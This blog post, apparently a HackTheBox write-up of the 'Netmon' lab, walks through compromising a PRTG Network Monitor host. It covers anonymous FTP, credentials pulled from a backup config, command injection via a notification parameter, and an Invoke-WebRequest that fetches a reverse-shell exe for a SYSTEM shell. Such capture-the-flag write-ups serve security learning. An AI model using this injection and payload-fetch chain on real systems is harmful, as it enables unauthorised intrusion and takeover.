---
published: true
layout: post
author: jake
date: '2019-06-30 00:00:01 UTC'
tags: htb walkthrough Netmon
Published: true
---
First of all we run an nmap scan:


```
root@kali: nmap -sC -sV -oN nmap 10.10.10.152
# Nmap 7.70 scan initiated Wed Mar 13 08:42:52 2019 as: nmap -sC -sV -oN nmap 10.10.10.152
Nmap scan report for 10.10.10.152
Host is up (0.25s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_03-12-19  04:13PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5m20s, deviation: 0s, median: 5m20s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-03-13 08:48:40
|_  start_date: 2019-03-11 11:59:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 13 08:43:23 2019 -- 1 IP address (1 host up) scanned in 30.91 seconds
```

Starting from the top, lets take a look at the anonymous FTP:
```
root@kali: ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
03-12-19  04:13PM       <DIR>          Windows
226 Transfer complete.
```
Looks like the ftp root is the Windows C:\ root, first things first lets dive into the users and see what we have access to:
```
ftp> cd users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
```
Only 2 users, interesting. Start by seeing if by some miracle we have direct access to the Administrators folder:
```
ftp> cd Administrator
550 Access is denied. 
```
Nope, but fair enough, we weren’t really expecting to be that lucky. Next we move on to the Public user:
```
ftp> cd Public
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
02-03-19  12:35AM                   33 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
```
Is that what I think I see? The user.txt already?! Only one way to find out. Change our FTP mode to binary and try to download it:
```
ftp> mode binary
We only support stream mode, sorry.
ftp> binary
200 Type set to I.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
33 bytes received in 0.25 secs (0.1309 kB/s) 
```
Done! We have user.txt, but no real indicator on how to actually get on the box or progress to Administrator and beyond.

Looking around the file system we notice that there is an application called Paessler PRTG Network Monitor, as this box is called Netmon, that seems a likely target for the next steps:
```
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
03-12-19  04:13PM       <DIR>          Windows
226 Transfer complete.
ftp> cd "Program Files (x86)"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-16-16  09:18AM       <DIR>          Common Files
07-16-16  09:18AM       <DIR>          internet explorer
07-16-16  09:18AM       <DIR>          Microsoft.NET
03-10-19  08:59PM       <DIR>          PRTG Network Monitor
11-20-16  09:53PM       <DIR>          Windows Defender
07-16-16  09:18AM       <DIR>          WindowsPowerShell
226 Transfer complete.
ftp> 
```
Looking for known exploits to the application, searchploit mentions XSS and DoS vulnerabilities, that we are not to interested in trying, eventually we come across a [reddit article](https://old.reddit.com/r/sysadmin/comments/835dai/) mentioning that it has been known to store credentials in plain text on the file system. We have access to the file system so head back to the FTP and look in the directories listed in the thread:
```
ftp> cd "programdata\paessler\prtg network monitor"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:40AM       <DIR>          Configuration Auto-Backups
03-11-19  08:00PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
03-12-19  12:17AM       <DIR>          Logs (Web Server)
02-25-19  08:01PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
03-12-19  07:12PM              1646511 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
```
Perfect! Looks like we have all the bak and old files listed in the thread! Time to download them and see what they contain:
```
ftp> get "PRTG Configuration.dat"
local: PRTG Configuration.dat remote: PRTG Configuration.dat
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1189697 bytes received in 3.22 secs (360.2972 kB/s)
ftp> get "PRTG Configuration.old"
local: PRTG Configuration.old remote: PRTG Configuration.old
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1189697 bytes received in 5.16 secs (225.1696 kB/s)
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 3.00 secs (375.4600 kB/s)
ftp> get "PRTG Graph Data Cache.dat"
local: PRTG Graph Data Cache.dat remote: PRTG Graph Data Cache.dat
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 467 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
1646511 bytes received in 4.00 secs (402.2832 kB/s)
```
Looking at the files, we can see that the “PRTG Configuration.old.bak” file is the oldest. so lets start there:
```
root@kali: cat PRTG\ Configuration.old.bak| grep -A 10 -B 10 password 
              <flags>
                <encrypted/>
              </flags>
            </comments>
            <dbauth>
              0
            </dbauth>
            <dbcredentials>
              0
            </dbcredentials>
            <dbpassword>
	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
            </dbpassword>
            <dbtimeout>
              60
            </dbtimeout>
            <depdelay>
              0
...
```
After looking at the file contents manually we can see that they are XML nodes and so we use the `-A` and `-B` arguments in grep to grab 10 lines above and below any lines that match the string “password” and we can see that we get a match for `prtgadmin:PrTg@dmin2018`

We have been so focused on the FTP we still haven’t looked at the websites yet. Straight up on port 80 we have what looks like the web interface for the PRTG Network Monitor. We try the credentials but they don’t seem to work:

![232226854.png]({{site.baseurl}}/Images/Netmon/232226854.png)

Thinking back, we did get the password from a .old.bak file, so it is possible that the user has changed the password since the backup was performed. Most users are creatures of habit and when required to change a password will simply increment the numbers on the end. Since the password we have ends in 2018 and the current year is now 2019 we try updating the password to `PrTg@dmin2019` and it works like a charm:

![232226864.png]({{site.baseurl}}/Images/Netmon/232226864.png)

One thing we notice almost straight away is the notification that there are updates available. Clicking the link we are directed to a screen showing us the currently installed version is 18.1.37.13946:

![232357905.png]({{site.baseurl}}/Images/Netmon/232357905.png)

Now that we have some credentials we can start looking for authenticated exploits. This combined with the software version we come across a [blog](https://www.codewatch.org/blog/?p=453) with an authenticated command execution exploit. So we head back to FTP to verify that the scripts mentioned are unsanitised by downloading them locally:
```
ftp> cd "program files (x86)\prtg network monitor\notifications\EXE"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
12-14-17  01:40PM                  534 Demo EXE Notification - OutFile.bat
12-14-17  01:40PM                  814 Demo EXE Notification - OutFile.ps1
226 Transfer complete.
ftp> get "Demo EXE Notification - OutFile.bat"
local: Demo EXE Notification - OutFile.bat remote: Demo EXE Notification - OutFile.bat
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
534 bytes received in 0.24 secs (2.1889 kB/s)
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
12-14-17  01:40PM                  534 Demo EXE Notification - OutFile.bat
12-14-17  01:40PM                  814 Demo EXE Notification - OutFile.ps1
226 Transfer complete.
ftp> get "Demo EXE Notification - OutFile.ps1"
local: Demo EXE Notification - OutFile.ps1 remote: Demo EXE Notification - OutFile.ps1
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
814 bytes received in 0.24 secs (3.3724 kB/s)
```

and looking at the contents:
```
root@kali: cat Demo\ EXE\ Notification\ -\ OutFile.ps1 
# Demo 'Powershell' Notification for Paessler Network Monitor
# Writes current Date/Time into a File
# 
# How to use it:
# 
# Create a exe-notification on PRTG, select 'Demo Exe Notifcation - OutFile.ps1' as program,
# The Parametersection consists of one parameter:
# 
# - Filename
# 
# e.g.
# 
#         "C:\temp\test.txt"
# 
# Note that the directory specified must exist.
# Adapt Errorhandling to your needs.
# This script comes without warranty or support.

if ($Args.Count -eq 0) {

  #No Arguments. Filename must be specified.

  exit 1;
 }elseif ($Args.Count -eq 1){

  $Path = split-path $Args[0];
  
  if (Test-Path $Path)    
  {
    $Text = Get-Date;
    $Text | out-File $Args[0];
    exit 0;
  
  }else
  {
    # Directory does not exist.
    exit 2;
  }
}
```

Looks the same to me, so let’s continue following the blog post and see if we can get command execution with the end goal of a shell.

From the top menu select Setup then under the My Account heading click Notifications

Use the little blue + on the right to create a new notification. Give the notification a name and scroll down and select the Execute Program box and use the .ps1 option with the parameter:
```
thoseguys.txt; ping 10.10.14.22
```

![232488998.png]({{site.baseurl}}/Images/Netmon/232488998.png)

Save the notification and head back on our attacking machine set up an ICMP listener to see if we get any ping requests from the target:
```
root@kali: tcpdump -nni tun0 icmp
```
Once the listener is set up manually trigger the notification by clicking on the row of the new notification and then clicking the Test notification button on the right

![232489006.png]({{site.baseurl}}/Images/Netmon/232489006.png)

Click Ok in the modal window that pops up.

After a few seconds we start to see the ping requests come through:
```
root@kali: cpdump -nni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
13:43:46.002919 IP 10.10.10.152 > 10.10.14.22: ICMP echo request, id 1, seq 101, length 40
13:43:46.002946 IP 10.10.14.22 > 10.10.10.152: ICMP echo reply, id 1, seq 101, length 40
13:43:47.019259 IP 10.10.10.152 > 10.10.14.22: ICMP echo request, id 1, seq 102, length 40
13:43:47.019288 IP 10.10.14.22 > 10.10.10.152: ICMP echo reply, id 1, seq 102, length 40
13:43:48.026426 IP 10.10.10.152 > 10.10.14.22: ICMP echo request, id 1, seq 103, length 40
13:43:48.026442 IP 10.10.14.22 > 10.10.10.152: ICMP echo reply, id 1, seq 103, length 40
13:43:49.032722 IP 10.10.10.152 > 10.10.14.22: ICMP echo request, id 1, seq 104, length 40
13:43:49.032736 IP 10.10.14.22 > 10.10.10.152: ICMP echo reply, id 1, seq 104, length 40
```
Great! we have command execution, time to transform this into a shell. We know that we have access to PowerShell, so lets use our trusty [rev.exe](https://github.com/thosearetheguise/rev) follow the instructions in the readme to compile an exe:
```
root@kali make ATTK_HOST=10.10.14.22 ATTK_PORT=443
```
Look in the `/build` directory for the compiled rev.exe. Now that we have our shell ready to go we need to get it on the box. 

We start by hosting the rev.exe with SimpleHTTPServer:
```
root@kali rev/build: python -m SimpleHTTPServer 80
```
Then update our notification to run the command:
```
Invoke-WebRequest http://10.10.14.22/rev.exe -OutFile C:\users\Public\Documents\thoseguys.exe
```

![232390727.png]({{site.baseurl}}/Images/Netmon/232390727.png)

Save and ‘test’ the notification and our SimpleHTTPServer will report that the rev.exe was downloaded. We can also head back to the Anonymous FTP connection to verify the file has been saved where we expected it to.

Now that we have our shell payload on the box all we need to do is set up a netcat listener and run the file:
```
root@kali: nc -nlvp 443
```
Update the notification again to be:
```
thoseguys.txt; & C:\Users\Public\Documents\thoseguys.exe
```
Run the notification and we get a reverse shell as `NT AUTHORITY\system`:
```
root@kali: nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.10.152] 50126

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
and can read the root.txt flag:
```
C:\Windows\system32>cd C:\users\administrator\desktop
cd C:\users\administrator\desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
3018[REDACTED]fba67cc
```
